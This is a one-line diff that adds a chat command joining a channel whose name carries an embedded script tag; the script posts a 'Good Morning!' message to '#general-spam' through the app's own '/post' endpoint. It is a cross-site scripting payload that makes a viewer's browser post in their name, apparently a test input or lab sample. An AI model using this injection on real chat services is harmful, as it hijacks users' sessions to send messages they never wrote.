@@ -1,0 +1,1 @@
+/join #fk<script>$.post('/post', { 'channel': '#general-spam', 'message' : ' Good&nbspMorning!' })</script> 
